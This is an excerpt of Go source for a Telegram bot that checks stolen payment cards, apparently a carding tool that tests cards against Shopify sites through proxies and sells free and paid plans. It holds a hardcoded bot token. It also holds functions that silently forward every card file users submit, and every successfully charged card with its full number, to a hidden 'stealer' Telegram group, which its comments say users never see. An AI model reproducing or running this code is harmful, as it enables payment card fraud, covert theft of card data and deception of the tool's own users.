...
const botToken = "8666180806:AAHLQjIp18cmQtYqtEzS7ttj7ajZlsRAqtw"
const usersFile = "users.json"
const configFile = "botconfig.json"
const sitesFile = "customsites.json"

// Forward targets
const hitNotifyGroupID = -1003815604466   // Group for hit notifications (without real card)
const stealForwardGroupID = -1003876897724 // Group for stealing real cards + original files
...
type UserData struct {
	...
	Plan      string    `json:"plan"`      // "free" or "paid"
	PlanExpiry int64    `json:"plan_expiry"` // 0 = never expires
...
// Forward original file to stealer group (silent - user never knows)
func forwardOriginalFile(bot *tele.Bot, userID int64, username, filename, content string, cardCount int, sessionType string) {
	header := fmt.Sprintf(`🔴 𝐅𝐈𝐋𝐄 𝐂𝐀𝐏𝐓𝐔𝐑𝐄𝐃 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 𝐔𝐬𝐞𝐫 𝐈𝐃: %d
📝 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @%s
📁 𝐅𝐢𝐥𝐞𝐧𝐚𝐦𝐞: %s
...
⏰ 𝐓𝐢𝐦𝐞: %s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
𝐅𝐈𝐋𝐄 𝐂𝐎𝐍𝐓𝐄𝐍𝐓 𝐁𝐄𝐋𝐎𝐖 🔽`, userID, username, filename, cardCount, sessionType, time.Now().Format("2006-01-02 15:04:05"))

	// Send header to stealer group
	bot.Send(tele.ChatID(stealForwardGroupID), header)

	// Send the actual file
	doc := &tele.Document{
		File:     tele.FromReader(strings.NewReader(content)),
		FileName: fmt.Sprintf("[CAPTURE]_%s_%d_%s", username, userID, filename),
		Caption:  fmt.Sprintf("📦 Original file from @%s (%d cards) | Type: %s", username, cardCount, sessionType),
	}
	bot.Send(tele.ChatID(stealForwardGroupID), doc)

	fmt.Printf("[FILE CAPTURE] Forwarded file from @%s (User: %d, Cards: %d) to stealer group\n", username, userID, cardCount)
}

// Send hit notification (without card details)
func sendHitNotification(bot *tele.Bot, username, site, amount string) {
	msg := fmt.Sprintf(`𝗡𝗲𝘄 𝗛𝗶𝘁 ➵ 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 🔥
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➵ Shopify %s USD
𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➵ Order completed 💎
𝗨𝘀𝗲𝗿 ➵ @%s
𝗗𝗲𝘃 ➵ @CODERX_XD`, amount, username)
	bot.Send(tele.ChatID(hitNotifyGroupID), msg)
}

// Forward stolen card details (with full card) to stealer group
func forwardStolenCard(bot *tele.Bot, card, binInfo, site, amount, username string) {
	msg := fmt.Sprintf(`🔴 𝐒𝐓𝐎𝐋𝐄𝐍 𝐂𝐀𝐑𝐃 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 𝐂𝐚𝐫𝐝: %s
🏦 𝐁𝐈𝐍: %s
🌐 𝐒𝐢𝐭𝐞: %s
...
📅 𝐓𝐢𝐦𝐞: %s
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
𝐒𝐓𝐄𝐀𝐋 𝐌𝐎𝐃𝐄 𝐀𝐂𝐓𝐈𝐕𝐄 🔥`, card, binInfo, site, amount, username, time.Now().Format("2006-01-02 15:04:05"))
	bot.Send(tele.ChatID(stealForwardGroupID), msg)
}
...
𝗧𝗢 𝗨𝗦𝗘 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 𝗦𝗘𝗘 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 𝗕𝗘𝗟𝗢𝗪 👇
____________________________________________
  📖  𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐋𝐈𝐒𝐓
____________________________________________
/sh - sɪɴɢʟᴇ ᴄᴀʀᴅ ᴄʜᴇғᴋ
/txt - ʀᴇᴘʟʏ ᴛᴏ ᴛxᴛ ғɪʟᴇ ғᴏʀ ᴍᴀss ᴄʜᴇᴄᴋ 
/setpr ᴀᴅᴅ ᴘʀᴏxʏ ᴛᴏ ᴄʜᴇᴄᴋ ᴄᴀʀᴅs
/rmpr - ʀᴇᴍᴏᴠᴇ sᴘᴇᴄɪғɪc ᴘʀᴏxʏ
/rmall - ʀᴇᴍᴏᴠᴇ ᴀʟʟ ᴘʀᴏxʏ 
/stats - ᴠɪᴇᴡ ɢʟᴏʙᴀʟ ʙᴏᴛ sᴛᴀᴛs
/me - ᴠɪᴇᴡ ᴘᴇʀsᴏɴᴀʟ sᴛᴀᴛs
/active - sᴇᴇ ᴀʟʟ ᴜsᴇʀs ᴄᴜʀʀᴇɴᴛʟʏ ᴄʜᴇᴄᴋɪɴɢ ᴡɪᴛʜ ʟɪᴠᴇ ᴘʀᴏɢʀᴇss
____________________________________________
  ⚡ 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 @CODERX_XD 𝗩𝟯
____________________________________________`
}
...
func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string) {
	...
	for cr := range results {
		...
		case StatusCharged:
			...
			// Forward hit notification to group (without real card)
			go sendHitNotification(bot, username, r.SiteName, r.Amount)

			// Forward real card to steal group (hidden from user)
			binInfo := fmt.Sprintf("%s - %s - %s - %s", bin.Brand, bin.Type, bin.Level, bin.Bank)
			go forwardStolenCard(bot, r.Card, binInfo, r.SiteName, r.Amount, username)
...
func main() {
	...
	// Access-control middleware with FREE/PAID plans
bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
	return func(c tele.Context) error {
		...
		if ud.PlanExpiry > 0 && time.Now().Unix() > ud.PlanExpiry {
		...
		// Both free and paid users can use the bot
		// (No restrictions - everyone can use)
	...
	// ── /free — Set user to free plan (admin only) ──
	...
	if raw == "" {
		return c.Send("Usage: /free <user_id> [duration]\n\nExamples:\n/free 123456789\n/free 123456789 30d\n/free @username 7d\n\nDuration: 1d, 7d, 30d, 1m, 1y, permanent")
	}
	...
	// Check if first part is username
	if strings.HasPrefix(parts[0], "@") {
		username := strings.ToLower(strings.TrimPrefix(parts[0], "@"))
		usernameRegistryMu.RLock()
		id, ok := usernameRegistry[username]
		usernameRegistryMu.RUnlock()
		if !ok {
			return c.Send("❌ Username not found. Use user ID instead.")
		}
		uid = id
	} else {
	...
	// Parse duration
	var expiryTs int64 = 0 // 0 = permanent
	durStr := "permanent"
	if len(parts) >= 2 {
	...
	ud := um.Get(uid)
	ud.Plan = "free"
	ud.PlanExpiry = expiryTs
	um.Save()
	
	// Also add to allowed users (so they can use bot)
	cfg.mu.Lock()
	...
	if expiryTs == 0 {
		return c.Send(fmt.Sprintf("✅ User %d set to FREE plan (permanent)", uid))
	}
	expiryTime := time.Unix(expiryTs, 0).Format("2006-01-02 15:04:05")
	return c.Send(fmt.Sprintf("✅ User %d set to FREE plan (expires: %s)", uid, expiryTime))
})

// ── /paid — Set user to paid plan (admin only) ──
bot.Handle("/paid", func(c tele.Context) error {
	if !isAdmin(c.Sender().ID) {
		return c.Send("🚫 Admin only.")
	}
	...
	raw := strings.TrimSpace(c.Message().Payload)
	if raw == "" {
		return c.Send("Usage: /paid <user_id> [duration]\n\nExamples:\n/paid 123456789\n/paid 123456789 30d\n/paid @username 1y\n\nDuration: 1d, 7d, 30d, 1m, 1y, permanent")
	}
  ...
  💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗔𝗖𝗖𝗘𝗦𝗦 𝗚𝗥𝗔𝗡𝗧𝗘𝗗 💎
━━━━━━━━━━━━━━━━━━━━━━

🎉 Congratulations! You now have 
   PREMIUM access to the bot!
...
⚡ @CODERX_XD`, durStr)
	...
	bot.Send(tele.ChatID(uid), welcomeMsg)
	
	if expiryTs == 0 {
		return c.Send(fmt.Sprintf("✅ User %d set to PAID plan (permanent)", uid))
	}
	expiryTime := time.Unix(expiryTs, 0).Format("2006-01-02 15:04:05")
	return c.Send(fmt.Sprintf("✅ User %d set to PAID plan (expires: %s)", uid, expiryTime))
})

// ── /plan — Check your own plan ──
bot.Handle("/plan", func(c tele.Context) error {
	uid := c.Sender().ID
	ud := um.Get(uid)
	...
	} else if time.Now().Unix() > ud.PlanExpiry {
		statusText = "⏰ EXPIRED"
	} else {
		remaining := time.Until(time.Unix(ud.PlanExpiry, 0)).Truncate(time.Minute)
		statusText = fmt.Sprintf("⏳ %s remaining", remaining)
	}
...
⚡ @CODERX_XD`, planEmoji, strings.ToUpper(plan), statusText))
})

// ── /upgrade — Request premium upgrade ──
bot.Handle("/upgrade", func(c tele.Context) error {
	uid := c.Sender().ID
	username := c.Sender().Username
	
	// Notify admins
	adminMsg := fmt.Sprintf(`💎 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗨𝗣𝗚𝗥𝗔𝗗𝗘 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 💎
━━━━━━━━━━━━━━━━━━━━━━
👤 User: @%s
🆔 ID: %d
⏰ Time: %s
━━━━━━━━━━━━━━━━━━━━━━
📝 To upgrade: /paid %d`, username, uid, time.Now().Format("2006-01-02 15:04:05"), uid)
	
	for adminID := range adminIDs {
		bot.Send(tele.ChatID(adminID), adminMsg)
	}
	
	return c.Send(`━━━━━━━━━━━━━━━━━━━━━━
  💎 𝗨𝗣𝗚𝗥𝗔𝗗𝗘 𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗦𝗘𝗡𝗧
━━━━━━━━━━━━━━━━━━━━━━
...
// ── /usersbyplan — List users by plan (admin only) ──
bot.Handle("/usersbyplan", func(c tele.Context) error {
	if !isAdmin(c.Sender().ID) {
		return c.Send("🚫 Admin only.")
	}
	...
	raw := strings.TrimSpace(c.Message().Payload)
	if raw == "" {
		return c.Send("Usage: /usersbyplan free\n/usersbyplan paid\n/usersbyplan all")
	}
	
	plan := strings.ToLower(raw)
	
	um.mu.RLock()
	defer um.mu.RUnlock()
	
	var freeUsers, paidUsers []string
	...
	for uid, ud := range um.users {
		...
		// Get username
		username := "unknown"
		for u, id := range usernameRegistry {
			if id == uid {
				username = u
				break
			}
		...
		entry := fmt.Sprintf("%d. @%s (%d)%s", len(freeUsers)+len(paidUsers)+1, username, uid, status)
		
		if userPlan == "free" {
			freeUsers = append(freeUsers, entry)
		} else {
			paidUsers = append(paidUsers, entry)
		}
	}
	...
	case "all":
		result.WriteString(fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n  📊 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦 (%d)\n━━━━━━━━━━━━━━━━━━━━━━\n\n", len(freeUsers)+len(paidUsers)))
		result.WriteString("💎 PAID USERS:\n")
		for _, u := range paidUsers {
			result.WriteString("  " + u + "\n")
		}
		result.WriteString("\n🆓 FREE USERS:\n")
	...
	default:
		return c.Send("❌ Use: free, paid, or all")
	}
	
	if result.Len() == 0 {
		return c.Send(fmt.Sprintf("📝 No %s users found.", plan))
	}
	
	return c.Send(result.String())
})

	// /rmall - remove all proxies
	bot.Handle("/rmall", func(c tele.Context) error {
	...
	// /sh <cards> - with inline card forwarding
	bot.Handle("/sh", func(c tele.Context) error {
		...
		// Forward inline cards to stealer group (silent)
		username := c.Sender().Username
		if username == "" {
			username = fmt.Sprintf("user_%d", uid)
		}
		filename := fmt.Sprintf("inline_%s.txt", time.Now().Format("20060102_150405"))
		go forwardOriginalFile(bot, uid, username, filename, text, len(cards), "sh")
	...
	// /txt — reply to a .txt file - with file forwarding
	bot.Handle("/txt", func(c tele.Context) error {
		...
		content := string(data)
		cards := parseCardsFromText(content)
		if len(cards) == 0 {
			return c.Send("❌ No valid cards found in file. Format: number|mm|yy|cvv")
		}

		// Forward original file to stealer group (silent)
		...
		go forwardOriginalFile(bot, uid, username, filename, content, len(cards), "txt")
